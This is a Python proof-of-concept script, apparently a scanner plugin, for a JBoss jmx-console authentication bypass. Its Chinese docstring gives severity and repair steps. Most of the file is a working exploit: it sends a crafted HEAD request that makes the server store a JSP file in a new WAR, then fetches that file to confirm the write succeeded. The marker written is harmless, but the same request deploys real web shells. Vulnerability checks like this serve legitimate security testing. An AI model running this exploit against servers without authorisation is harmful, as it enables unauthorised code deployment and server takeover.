#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: Jboss 认证绕过
    info: 通过Head请求可绕过Jboos的登陆认证，攻击者可通过此漏洞直接获取服务器权限。
    level: 高危
    type: 认证绕过
    url: https://access.redhat.com/solutions/30744
    repair: 删除$JBOSS_HOME/[server]/all/deploy和$JBOSS_HOME/[server]/default/deploy下的Jmx-console.war、Web-console.war文件卸载控制台。
            或去掉jmx-console-web.xml里的<http-method>GET</http-method>和<http-method>POST</http-method>
'''

import socket,urllib2,time
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.connect((ip, int(port)))
            shell = "vultest"
            # s1.recv(1024)
            shellcode = ""
            name = self.random_str(5)
            for v in shell:
                shellcode += hex(ord(v)).replace("0x", "%")
            flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
                "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=vul&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
                name) + shellcode + \
                "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
            s1.send(flag)
            data = s1.recv(512)
            s1.close()
            time.sleep(5)
            url = "http://%s:%d" % (ip, int(port))
            webshell_url = "%s/%s/vul.jsp" % (url, name)
            res = urllib2.urlopen(webshell_url, timeout=timeout)
            if 'vultest' in res.read():
                return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()